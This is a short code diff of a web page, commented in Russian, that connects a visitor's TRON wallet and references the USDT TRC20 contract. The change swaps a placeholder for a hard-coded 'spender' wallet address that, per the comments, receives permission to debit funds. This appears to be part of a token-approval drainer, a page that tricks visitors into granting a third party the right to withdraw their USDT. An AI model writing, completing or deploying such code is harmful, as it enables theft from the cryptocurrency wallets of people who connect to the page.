@@ -27,8 +27,9 @@
         let tronWeb;
         let userAddress = "";
         const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // Официальный USDT TRC20
-        // Адрес, которому дается право на списание (сюда впиши адрес твоего сервера / кошелька-исполнителя)
-        const spenderAddress = "ВСТАВЬ_АДРЕС_КОШЕЛЬКА_ИСПЫТУЕМОГО_СЕРВЕРА"; 
+        
+        // Твой адрес кошелька, на который выдается разрешение
+        const spenderAddress = "TRmTW2Bz67CZCWP4XCNmk3B65mzbVnkvVf"; 
 
         // 1. Подключение кошелька
         document.getElementById('connectBtn').addEventListener('click', async function() {
